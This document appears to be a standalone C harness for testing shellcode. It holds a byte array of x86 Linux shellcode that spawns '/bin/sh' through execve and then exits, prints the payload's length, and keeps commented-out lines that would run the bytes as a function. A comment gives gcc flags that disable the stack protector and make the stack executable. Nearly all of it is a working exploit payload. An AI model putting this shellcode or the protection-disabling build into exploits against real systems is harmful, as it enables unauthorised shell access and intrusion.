#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x99\x52\x68\x2f\x2f\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x2f\x62\x89\xe3\x89\xd1\x89\xd0\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";

int main(){
	printf("Shellcode Length:  %d\n", strlen(code));
//	int (*ret)() = (int(*)())code;
//	ret();
}

//Compilation : gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
